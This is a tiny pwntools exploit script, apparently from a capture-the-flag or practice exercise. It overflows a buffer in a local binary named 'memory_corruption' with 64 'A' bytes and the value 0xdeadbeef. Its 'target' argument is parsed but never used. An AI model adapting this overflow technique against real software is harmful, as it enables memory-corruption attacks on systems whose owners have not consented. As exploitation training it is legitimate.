#!/usr/bin/python
from pwn import *
import sys

if len(sys.argv) == 1:
    target = "./memory_corruption"
else:
    target = sys.argv[1]

p = process("./memory_corruption")
p.sendline("A" * 64 + p32(0xdeadbeef))
print p.recv()
